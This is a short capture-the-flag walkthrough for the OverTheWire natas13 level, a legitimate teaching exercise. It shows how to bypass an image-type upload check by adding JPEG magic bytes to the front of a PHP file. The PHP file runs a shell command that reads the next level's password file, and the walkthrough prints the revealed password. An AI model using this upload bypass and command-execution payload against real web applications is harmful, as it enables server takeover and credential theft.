This challenge is really similar to natas12, although in this one it checks if it's an image that is being uploaded.

The function exif_imagetype() reads the first bytes of an image and checks if it corresponds to its signature (magic bytes).

So we need to think what can we do to bypass this check...

Well, we can create a normal php file and add the jpeg magic bytes at the beggining, lets try it!

JPEG magic bytes -> FF D8 FF EE

To do that we'll do the following with python:

Python 2.7.15+ (default, Aug 31 2018, 11:56:52) 
[GCC 8.2.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> fh = open('shell.php', 'w')
>>> fh.write('\xFF\xD8\xFF\xEE' + '<?php echo shell_exec("cat /etc/natas_webpass/natas14"); ?>')
>>> fh.close()


Now let's try to upload it! Don't forget to change the file extension on burpsuite!


Success! The key to next level is: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
